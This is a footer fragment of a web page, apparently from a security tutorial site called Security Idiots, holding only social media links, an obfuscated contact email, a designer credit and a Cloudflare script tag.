<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="mssql-dios.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="f8999c959196b88b9d9b8d8a918c81919c91978c8bd69b9795">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>